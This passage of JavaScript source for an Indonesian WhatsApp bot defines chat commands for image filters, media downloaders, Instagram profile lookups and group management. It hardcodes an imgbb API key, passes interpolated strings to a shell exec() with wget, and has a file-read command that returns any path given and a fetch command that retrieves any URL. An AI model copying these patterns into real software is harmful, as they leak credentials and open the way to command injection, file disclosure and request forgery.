  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					sticWait(from)
					owgi = await  kurr.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu2 = `https://some-random-api.ml/canvas/wasted?avatar=${teks}`
					exec(`wget ${anu2} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					kurr.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
					break 
		case 'pelangi':
		case 'rainbow':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					sticWait(from)
					owgi = await  kurr.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu3 = `https://some-random-api.ml/canvas/gay?avatar=${teks}`
					exec(`wget ${anu3} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					kurr.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
					break 
		case 'sepia':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					sticWait(from)
					owgi = await  kurr.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu4 = `https://some-random-api.ml/canvas/sepia?avatar=${teks}`
					exec(`wget ${anu4} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					kurr.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
					break 
					//Fun not faedah
               case 'brainly':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					if (args.length < 1) return reply('Pertanyaan apa')
		          	brien = args.join(' ')
					brainly(`${brien}`).then(res => {
					teks = '❉───────────────────────❉\n'
					for (let Y of res.data) {
					teks += `\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n❉──────────────────❉\n`
					}
					kurr.sendMessage(from, teks, text,{quoted:mek,detectLinks: false})                        
		            })              
					break
case 'igstalk':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
try{
if (!c) return reply('Usernamenya?')
ig.fetchUser(`${args.join(' ')}`).then(Y => {
console.log(`${args.join(' ')}`)
ten = `${Y.profile_pic_url_hd}`
teks = `*ID* : ${Y.profile_id}\n*Username* : ${args.join('')}\n*Full Name* : ${Y.full_name}\n*Bio* : ${Y.biography}\n*Followers* : ${Y.following}\n*Following* : ${Y.followers}\n*Private* : ${Y.is_private}\n*Verified* : ${Y.is_verified}\n\n*Link* : https://instagram.com/${args.join('')}`
sendMediaURL(from,ten,teks) 
})} catch {
const tod = await fetchJson(
`https://ferdiz-afk.my.id/api/stalkig?username=${c}`
);
var nih_buff = await getBuffer(tod.picurl);
const tt = `*INSTAGRAM STALK*

\nUsername: ${tod.username}\nFullname: ${tod.fullname}\npostingan: ${tod.post}\ncategory_akun: ${tod.category_name}\nverified: ${tod.verified_user}\nprivate: ${tod.private_user}\nFollowing: ${tod.following}\nFollower: ${tod.followers}\nBio:\n${tod.bio}`;
kurr.sendMessage(from, nih_buff, image, { quoted: mek, caption: tt });
}
break;      
break    
                case 'bisakah':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					bisakah = body.slice(1)
					const bisa =['Bisa','Tidak Bisa','Coba Ulangi','Ngimpi kah?','yakin bisa?']
					const keh = bisa[Math.floor(Math.random() * bisa.length)]
					kurr.sendMessage(from, 'Pertanyaan : *'+bisakah+'*\n\nJawaban : '+ keh, text, { quoted: mek })
					break
				case 'kapankah':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					kapankah = body.slice(1)
					const kapan =['Besok','Lusa','Tadi','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Minggu Lagi','2 Minggu Lagi','3 Minggu Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagi','3 Tahun Lagi','4 Tahun Lagi','5 Tahun Lagi','6 Tahun Lagi','1 Abad lagi','3 Hari Lagi','Tidak Akan Pernah','YNTKTS','APA SIH NANYA MULU']
					const koh = kapan[Math.floor(Math.random() * kapan.length)]
					kurr.sendMessage(from, 'Pertanyaan : *'+kapankah+'*\n\nJawaban : '+ koh, text, { quoted: mek })
					break
         			  case 'apakah':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					apakah = body.slice(1)
					const apa =['Iya','Tidak','Bisa Jadi','Coba Ulangi','Tanyakan Ayam','YNTKTS']
					const kah = apa[Math.floor(Math.random() * apa.length)]
					kurr.sendMessage(from, 'Pertanyaan : *'+apakah+'*\n\nJawaban : '+ kah, text, { quoted: mek })
					break
				case 'rate':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					rate = body.slice(1)
					const ra =['4','9','17','28','34','48','59','62','74','83','97','100','29','94','75','82','41','39']
					const te = ra[Math.floor(Math.random() * ra.length)]
					kurr.sendMessage(from, 'Pertanyaan : *'+rate+'*\n\nJawaban : '+ te+'%', text, { quoted: mek })
					break
		    case 'tiktokaudio':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
		 		if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.error.api)
 		if (!c) return reply('Linknya?')
 		sticWait(from)
		hx.ttdownloader(`${args[0]}`)
    		.then(result => {
    		const { wm, nowm, audio } = result
    		axios.get(`https://tinyurl.com/api-create.php?url=${nowm}`)
    		.then(async (a) => {
    		me = `*Link* : ${a.data}`
    nowmm = await getBuffer(audio)
	kurr.sendMessage(from,nowmm ,MessageType.audio,{mimetype:'audio/mp4',quoted: mek})
		})
		})
		break 
	case 'igstory': 
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
            if(!c) return reply('Usernamenya?')
            hx.igstory(`${c}`)
            .then(async result => {
            for(let i of result.medias){
                if(i.url.includes('mp4')){
                    let link = await getBuffer(i.url)
                    kurr.sendMessage(from,link,video,{quoted: mek,caption: `Type : ${i.type}`})
                } else {
                    let link = await getBuffer(i.url)
                    kurr.sendMessage(from,link,image,{quoted: mek,caption: `Type : ${i.type}`})                  
                }
            }
            });
            break
    case 'playstore':
    if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
            if(!c) return reply('lu nyari apa?')
            let play = await hx.playstore(`${c}`)
            let store = '❉─────────────────────❉\n'
            for (let i of play){
            store += `\n*「 *PLAY STORE* 」*\n
- *Nama* : ${i.name}
- *Link* : ${i.link}\n
- *Dev* : ${i.developer}
- *Link Dev* : ${i.link_dev}\n❉─────────────────────❉`
            }
            reply(store)
            break
		    case 'fb':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
            if (!c) return reply('Linknya?')
            if (!isUrl(args[0]) && !args[0].includes('facebook.com')) return reply(mess.error.api)
            sticWait(from)
            te = args.join(' ')
            hx.fbdown(`${te}`)
            .then(G => {
            ten = `${G.HD}`
            sendMediaURL(from,ten,`*LINK VIDEO* : ${G.Normal_video}`)
            })
            break    
case 'linkwa':
case 'grupwa':
case 'groupwa':
case 'gcwa':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
            if(!c) return reply('cari group apa?')
            hx.linkwa(`${c}`)
            .then(result => {
            let res = '「 *GC WA* 」\n\n'
            for (let i of result) {
            res += `*Nama*: *${i.nama}\n*Link*: ${i.link}\n\n`
            }
            reply(res)
            });
            break 
    case 'otaku':
    if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
            if(!c) return reply('judul animenya?')
            let anime = await hx.otakudesu(`${c}`)
            rem = `*Judul* : ${anime.judul}
*Jepang* : ${anime.jepang}
*Rating* : ${anime.rate}
*Produser* : ${anime.produser}
*Status* : ${anime.status}
*Episode* : ${anime.episode}
*Durasi* : ${anime.durasi}
*Rilis* : ${anime.rilis}
*Studio* : ${anime.studio}
*Genre* : ${anime.genre}\n
*Sinopsis* :
${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.batchSD}\n*Link Download HD* : ${anime.batchHD}`
            ram = await getBuffer(anime.img)
            kurr.sendMessage(from,ram,image,{quoted:mek,caption:rem})
            break
    case 'komiku':
    if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
            if(!c) return reply(`judulnya?\n${prefix}komiku mao gakuin`)
            let komik = await hx.komiku(`${c}`)
            result = `*Title* : ${komik.title}\n
*Title Indo* : ${komik.indo}\n
*Update* : ${komik.update}\n
*Desc* : ${komik.desc}\n
*Chapter Awal* : ${komik.chapter_awal}
*Chapter Akhir* : ${komik.chapter_akhir}`
            sendMediaURL(from, komik.image,result)
            break  
		    case 'twmp4': case 'twitter':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (args.length < 1) return reply('Link?')
lin = args[0]
sticWait(from)
hx.twitter(lin).then(res => {
console.log('[ TWITTER ] downloader')
Anu = res.SD
fto = fs.readFileSync('./thumb.jpg')
sendMediaURL(from, Anu, 'Done!')
})
break
case 'twmp3':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (args.length < 1) return reply('Link?')
lin = args[0]
sticWait(from)
hx.twitter(lin).then(async (res) => {
console.log('[ TWITTER ] downloader')
Anu = res.SD
khs = await getBuffer(Anu)
kurr.sendMessage(from, khs, audio, {mimetype:'audio/mp4', filename:'audio.mp3', quoted:mek, ptt:true})
})
break
    case 'chara':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
            if(!c) return reply(`gambar apa?\n${prefix}chara nino`)
            let im = await hx.chara(`${c}`)
            let acak = im[Math.floor(Math.random() * im.length)]
            let li = await getBuffer(acak)
            await kurr.sendMessage(from,li,image,{quoted: mek})
            break
//Navi
					          case 'unpin':
                if (!isOwner && !mek.key.fromMe) return sticOwner(from)
                kurr.modifyChat(from, ChatModification.unpin)
                reply('*succes unpin this chat*')
                console.log('unpin chat = ' + from)
                break
            case 'pin':
                if (!isOwner && !mek.key.fromMe) return sticOwner(from)
                kurr.modifyChat(from, ChatModification.pin)
                reply('*succes pin this chat*')
                console.log('pinned chat = ' + from)
                break
             case 'archive':
                if (!isOwner && !mek.key.fromMe) return sticOwner(from)
                reply('*okey wait..*')
                console.log('succes archive chat = ' + from)
                await sleep(3000)
                kurr.modifyChat(from, ChatModification.archive)
                break
            case 'unreadall':
                if (!isOwner && !mek.key.fromMe) return sticOwner(from)
                var chats = await kurr.chats.all()
                chats.map( async ({ jid }) => {
                await kurr.chatRead(jid, 'unread')
                    })
		    var teks = `\`\`\`Successfully unread ${chats.length} chats !\`\`\``
		    await kurr.sendMessage(from, teks, text, {quoted: mek})
		    console.log(chats.length)
	        break
            case 'readall':
                if (!isOwner && !mek.key.fromMe) return sticOwner(from)
                var chats = await kurr.chats.all()
                chats.map( async ({ jid }) => {
                await kurr.chatRead(jid)
                })
		var teks = `\`\`\`Successfully read ${chats.length} chats !\`\`\``
	        await kurr.sendMessage(from, teks, text, {quoted: mek})
		console.log(chats.length)
		break
            case 'unarchiveall':
                if (!isOwner && !mek.key.fromMe) return sticOwner(from)
                reply('*succes unarchive all chat*')
                console.log('succes unarchive chat = ' + from)
                anu = await kurr.chats.all()
                for (let _ of anu) {
                kurr.modifyChat(_.jid, ChatModification.unarchive)
                }
                break
case 'tutuptime':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return sticAdmin(from)
if (!isBotGroupAdmins) return sticNotAdmin(from)
if (args[1]=="detik") {var timer = args[0]+"000"
} else if (args[1]=="menit") {var timer = args[0]+"0000"
} else if (args[1]=="jam") {var timer = args[0]+"00000"
} else {return reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
setTimeout( () => {
var nomor = mek.participant
kurr.groupSettingChange (from, GroupSettingChange.messageSend, true);
}, timer)
break
case 'bukatime':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return sticAdmin(from)
if (!isBotGroupAdmins) return sticNotAdmin(from)
if (args[1]=="detik") {var timer = args[0]+"000"
} else if (args[1]=="menit") {var timer = args[0]+"0000"
} else if (args[1]=="jam") {var timer = args[0]+"00000"
} else {return reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
setTimeout( () => {
var nomor = mek.participant
kurr.groupSettingChange (from, GroupSettingChange.messageSend, false);
}, timer)
break
case 'leavetime':
if (!isGroup) return reply(mess.only.group)
if (!isOwner && !mek.key.fromMe) return sticOwner(from)
if (args[1]=="detik") {var timer = args[0]+"000"
} else if (args[1]=="menit") {var timer = args[0]+"0000"
} else if (args[1]=="jam") {var timer = args[0]+"00000"
} else {return reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
setTimeout( () => {
kurr.groupLeave(from);
}, timer)
case 'nano':
if (!isOwner && !mek.key.fromMe) return sticOwner(from)
if (!c) return reply('Nama file nya apaa ?')
anu = fs.readFileSync(`${c}`)
reply(String(anu))
break
case 'setmenu':
if (!isOwner && !mek.key.fromMe) return sticOwner(from)
if(args[0] == 'ori'){
menusimpel = true
reply('Sucsess')
}else if(args[0] == 'simpel'){
menusimpel = false
reply('Sucsess')
}else if (!c) {
anu =`Silahkan pilih salah satu di bawah`
 buttons = [{buttonId: 'setmenu ori', buttonText: {displayText: 'ORI'}, type: 1},{buttonId: 'setmenu simpel', buttonText: {displayText: 'SIMPEL'}, type: 1}]
const skuygelud = {
    contentText: `${anu}`,
    footerText: '*_©⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗_*',
    buttons: buttons,
    headerType: 1
}
await kurr.sendMessage(from, skuygelud, MessageType.buttonsMessage, {quoted: ftrol})
}
break
case 'setallmenu':
if (!isOwner && !mek.key.fromMe) return sticOwner(from)
if(args[0] == 'ori'){
menuall = true
reply('Sucsess')
}else if(args[0] == 'simpel'){
menuall = false
reply('Sucsess')
}else if (!c) {
anu =`Silahkan pilih salah satu di bawah`
 buttons = [{buttonId: 'setallmenu ori', buttonText: {displayText: 'ORI'}, type: 1},{buttonId: 'setallmenu simpel', buttonText: {displayText: 'SIMPEL'}, type: 1}]
const skuygf = {
    contentText: `${anu}`,
    footerText: '*_©⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗_*',
    buttons: buttons,
    headerType: 1
}
await kurr.sendMessage(from, skuygf, MessageType.buttonsMessage, {quoted: ftrol})
}
break
//Sampai sini
case 'jadibot':
    if (isGroup) return reply('TIDAK BISA JADIBOT DIDALAM GRUP HARAP PC NOMER SAJA')
    if(mek.key.fromMe) return reply('Tidak bisa jadibot di dalam bot')
    jadibot(reply,kurr,from)
    break
    case 'stopjadibot':
    if (!isOwner && !isOwner) return reply(mess.only.prem)
    if(mek.key.fromMe)return reply('tidak bisa stopjadibot kecuali owner')
    stopjadibot(reply)
    break
    case 'listbot':
    if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
    let tekss = '「 *LIST JADIBOT* 」\n'
    for(let i of listjadibot) {
    tekss += `*Nomor* : ${i.jid.split('@')[0]}
*Nama* : ${i.name}
*Device* : ${i.phone.device_manufacturer}
*Model* : ${i.phone.device_model}\n\n`
    }
    reply(tekss)
    break
case 'owner':
	case 'creator':
case 'developer':
		case 'author':
let ini_list = []
for (let i of ownerNumber) {
const vname = kurr.contacts[i] != undefined ? kurr.contacts[i].vname || kurr.contacts[i].notify : undefined
ini_list.push({
"displayName": `Developer ShinChan Yucan`,
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;${NamaOwner};;;\nFN:${vname ? `${vname}` : `${NamaOwner}`}\nitem1.TEL;waid=${NomorOwner}:${NomorOwner2}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
})
}
kurr.sendMessage(from, {
"displayName": `Developer ShinChan Yucan`,
"contacts": ini_list 
}, 'contactsArrayMessage', { quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true }})
break
case 'addcmd': 
case 'setcmd':
if (!isOwner && !mek.key.fromMe) return sticOwner(from)
if (isQuotedSticker) {
if (!c) return reply(`Penggunaan : ${command} cmdnya dan tag stickernya`)
var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
addCmd(kodenya, c)
reply("Done Bwang")
} else {
reply('tag stickenya')
}
break
case 'delcmd':
if (!isOwner && !mek.key.fromMe) return sticOwner(from)
if (!isQuotedSticker) return reply(`Penggunaan : ${command} tagsticker`)
var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
scommand.splice(getCommandPosition(kodenya), 1)
fs.writeFileSync('./database/scommand.json', JSON.stringify(scommand))
reply("Done Bwang")
break
case 'listcmd':
if (!isOwner && !mek.key.fromMe) return sticOwner(from)
let teksnyee = `\`\`\`「 LIST CMD STIC 」\`\`\``
let cemde = [];
for (let i of scommand) {
cemde.push(i.id)
teksnyee += `\n\n*❏ ID :* ${i.id}\n*❏ Cmd :* ${i.chats}`
}
reply(teksnyee)
break
				case 'script':
		case 'sc':
		case 'sewabot':
		case 'sourcecode':
		anu =`JANGAN LUPA FOLLOW
		https://Instagram.com/quotes.thenay_`
 buttons = [
{buttonId: `menu`, buttonText: {displayText: 'BACK➡️'}, type: 1},
{buttonId:`donasi`,buttonText:{displayText:'SEDEKAH'},type:1},
{buttonId: `owner`, buttonText: {displayText: 'PEMBUAT'}, type: 1}
]
const btnskuy = {
    contentText: `${anu}`,
    footerText: '*_©⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗_*',
    buttons: buttons,
    headerType: 1
}
await kurr.sendMessage(from, btnskuy, MessageType.buttonsMessage, {quoted: ftrol})
		break
case 'STOP':
reply('STOP YA TINGGAL STOP AJG, NGAPAIN DI PENCET NGEMTOD')
break
case 'donasi':
dona = fs.readFileSync('./media/donasi.jpg')
doni =`*╭─❒ 「 Donasi 」 ──────*
*│*
*│*⬡ *Mau donasi apa cuma liat doang?*
*│*⬡ *PULSA  : ${pulsa}*
*│*⬡ *DANA    : ${dana}*
*└───────────────────*
jauhilah api neraka, walau hanya dengan bersedekah sebiji kurma (sedikit). Jika kamu tidak punya, maka bisa dengan kalimah thayyibah”
 [HR. Bukhari 6539, Muslim 1016]`
kurr.sendMessage(from, dona, image, { quoted: ftrol, thumbnail: dona, caption: doni })
break
       case 'debug':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
			 res = await kurr.prepareMessageFromContent(from,{
"templateMessage": {
						"hydratedTemplate": {
							"hydratedContentText": `Hi ${pushname} 👋,\n\n${jmn} - ${week} ${weton} - ${calender}`,
							"hydratedFooterText": `⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗`,
							"hydratedButtons": [
								{
									"quickReplyButton": {
										"displayText": "List Menu",
										"id": "60dd75b0081979507a679f99"
									},
									"index": 0
								},
								{
									"quickReplyButton": {
										"displayText": "Script",
										"id": "60dd75b0081979507a679f99"
									},
									"index": 1
								},
								{
									"quickReplyButton": {
										"displayText": "Instagram",
										"id": "60dd75b0081979507a679f99"
									},
									"index": 2
								}
							]
						}
					}
				}, {}) 
kurr.relayWAMessage(res)
break
case 'debug2':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
   res = await kurr.prepareMessageFromContent(from,{
"templateMessage": {
  "hydratedFourRowTemplate": {
    "hydratedContentText": "",
    "hydratedFooterText": "",
    "hydratedButtons": [
      {
        "urlButton": {
          "displayText": "",
          "url": ""
        },
        "index": 0
      }
    ]
  },
  "hydratedTemplate": {
    "hydratedContentText": `Hi ${pushname} 👋,\n\n${jmn} - ${week} ${weton} - ${calender}`,
    "hydratedFooterText": `⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗`,
    "hydratedButtons": [
      {
        "urlButton": {
          "displayText": `Follow Instagram Owner`,
          "url": "https://Instagram.com/quotes.thenay_"
        },
        "index": 0
      }
    ]
  }
}
}, {})
kurr.relayWAMessage(res)
break
case 'ig':
case 'igdl':
case 'instagram':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!c) return reply('Linknya?')
var { igDownloader } = require('./lib/igdown')
   res = await igDownloader(`${c}`).catch(e => {
reply(mess.error.api)
})
console.log(res)
sendMediaURL(from,`${res.result.link}`,`${res.result.desc}`)
                    break
                    case 'tiktok':
                   case 'tiktokdl':
                   case 'tiktoknowm':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!c) return reply('Linknya?')
var { TiktokDownloader } = require('./lib/tiktokdl')
sticWait(from)
res = await TiktokDownloader(`${c}`).catch(e => {
reply(mess.error.api)
})
console.log(res)
sendMediaURL(from, `${res.result.nowatermark}`)
break
                    case 'tourl':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
    if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
            boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
            owgi = await kurr.downloadMediaMessage(boij)
            res = await upload(owgi)
            reply(res)
            } else {
            reply('kirim/reply gambar/video')
            }
            break
case 'viewonce':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
res = await kurr.prepareMessageFromContent(from,{
"viewOnceMessage": {
"message": {
"imageMessage": {
"mimetype": 'image/jpeg',
"jpegThumbnail": dfrply,
"viewOnce": true
}
}
}
}, {}) 
kurr.relayWAMessage(res)
break
case 'pinterest':
            if(!q) return reply('gambar apa?')
            let pin = await hx.pinterest(q)
            let ac = pin[Math.floor(Math.random() * pin.length)]
            let di = await getBuffer(ac)
            await kurr.sendMessage(from,di,image,{quoted: mek, thumbnail: Buffer.alloc(0)})
            break
case 'image':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
            if (args.length < 1) return freply('Masukan teks!')
            const gimg = args.join('');
            sticWait(from)
            googleImage(gimg, async (error, result) => {
            n = result
            images = n[Math.floor(Math.random() * n.length)].url
            kurr.sendMessage(from,{url:images},image,{quoted:mek})
            });
            break
case 'isbaileys': 
case 'bail': 
case 'baileys':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
reply(`${mek.quoted.isBaileys}`)
break
case 'getcaption':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
try {
reply(`${mek.quoted.title}`)
} catch {
reply(`${mek.quoted.caption}`)
}
break
case 'q': 
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
    if (!m.quoted) return reply('reply pesan!')
    let qse = kurr.serializeM(await m.getQuotedObj())
    if (!qse.quoted) return reply('pesan yang anda reply tidak mengandung reply!')
    await qse.quoted.copyNForward(m.chat, true)
break
case 'cek':
if (!isOwner && !mek.key.fromMe) return sticOwner(from)
await m.quoted.download().then(v => kurr.sendMessage(from, v.toString('utf-8'), 'extendedTextMessage'))
break
case 'repeat':       
if (!isOwner && !mek.key.fromMe) return sticOwner(from)
var xzn_kawaii = `${args.join(' ')}`
var kata = xzn_kawaii.split("|")[0];
var angka = xzn_kawaii.split("|")[1]
let meme = `${kata}`.repeat(angka)
kurr.sendMessage(from, meme, MessageType.text, { quoted: fonce })
break
case 'listgc':
case 'gclist':
case 'listgroup':
                case 'listgrup':
                case 'listgrop':
                case 'gruplist':
                case 'groplist':
                case 'grouplist':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
  const txs = kurr.chats.all().filter(v => v.jid.endsWith('g.us')).map(v =>`- ${kurr.getName(v.jid)}\n${v.jid}\n[${v.read_only ? 'Left' : 'Joined'}]`).join`\n\n`
  reply(txs)
  break
  case 'caripesan':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (args.length < 1) return reply(`Penggunaan ${prefix}caripesan Hi|15`)
tekse = args.join('')
if (tekse.includes("|")) { 
try {
var ve = tekse.split("|")[0]
var za = tekse.split("|")[1]
if (za > 15) return reply('maksimal 15')
sampai = `${za}`
batas = parseInt(sampai) + 1
cok = await kurr.searchMessages(`${ve}`, from, batas,1) 
if (cok.messages.lenght < 2) return reply('Pesan tidak ditemukan!') 
if (cok.messages.length < parseInt(batas)) reply(`Hanya ditemukan ${cok.messages.length - 1} Pesan`)
for (let i=1;i < cok.messages.length;i++) {
if (cok.messages[i].message) {
kurr.sendMessage(from, `Nih pesannya!`, text, {quoted: cok.messages[i]}) 
}
}
} catch(e) {
console.log(e)
return reply(mess.error.api)
}
} else {
reply(`Penggunaan ${prefix}caripesan Hi|15`)
}
break
  case 'get':
case 'fetch':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
            if(!c) return reply('Linknya?')
            fetch(`${args[0]}`).then(res => res.text())  
            .then(bu =>{
            reply(bu)
            })   
            break
            case 'autorespon':
      if (!isOwner && !mek.key.fromMe) return sticOwner(from)
           if (c === 'on'){
              autorespon = false
                    reply(`Berhasil mengaktifkan autorespon`)
                } else if (c === 'off'){
                    autorespon = true
                    reply(`Berhasil menonaktifkan autorespon`)
                } else if (!c) {
                    anu =`Silahkan pilih salah satu\n\non: untuk mengaktifkan\noff: untuk menonaktifkan`
const buttons = [{buttonId: 'autorespon on', buttonText: {displayText: 'ON✔️'}, type: 1},{buttonId: 'autorespon off', buttonText: {displayText: 'OFF✖️'}, type: 1}]
const btnharam = {
    contentText: `${anu}`,
    footerText: '*_©⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗_*',
    buttons: buttons,
    headerType: 1
}
await kurr.sendMessage(from, btnharam, MessageType.buttonsMessage, {quoted: ftrol})
                }
                break
                case 'antidelete':
      if (!isOwner && !mek.key.fromMe) return sticOwner(from)
           if (c === 'on'){
             antidelete = false
                    reply(`Berhasil mengaktifkan antidelete`)
                } else if (c === 'off'){
                    antidelete = true
                    reply(`Berhasil menonaktifkan antidelete`)
                } else if (!c) {
                    anu =`Silahkan pilih salah satu\n\non: untuk mengaktifkan\noff: untuk menonaktifkan`
const buttons = [{buttonId: 'antideletee on', buttonText: {displayText: 'ON✔️'}, type: 1},{buttonId: 'antideletee off', buttonText: {displayText: 'OFF✖️'}, type: 1}]
const buttonMessage = {
    contentText: `${anu}`,
    footerText: '*_©⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗_*',
    buttons: buttons,
    headerType: 1
}
await kurr.sendMessage(from, buttonMessage, MessageType.buttonsMessage, {quoted: ftrol})
                }
                break
                case 'setprefix':
      if (!isOwner && !mek.key.fromMe) return sticOwner(from)
      if (args.length < 1) return reply(`Contoh ${prefix + command} multi/nopref`)
           if (c === 'multi'){
              multi = true
                    reply(`Berhasil mengubah prefix ke ${c}`)
                } else if (c === 'nopref'){
                    multi = false
                    nopref = true
                    reply(`Berhasil mengubah prefix ke ${c}`)
                } else {
                    multi = false
                    nopref = false
                    prefa = `${c}`
                    reply(`Berhasil mengubah prefix ke ${c}`)
					}
					break
case 'autovn':
if (!isOwner && !mek.key.fromMe) return sticOwner(from)
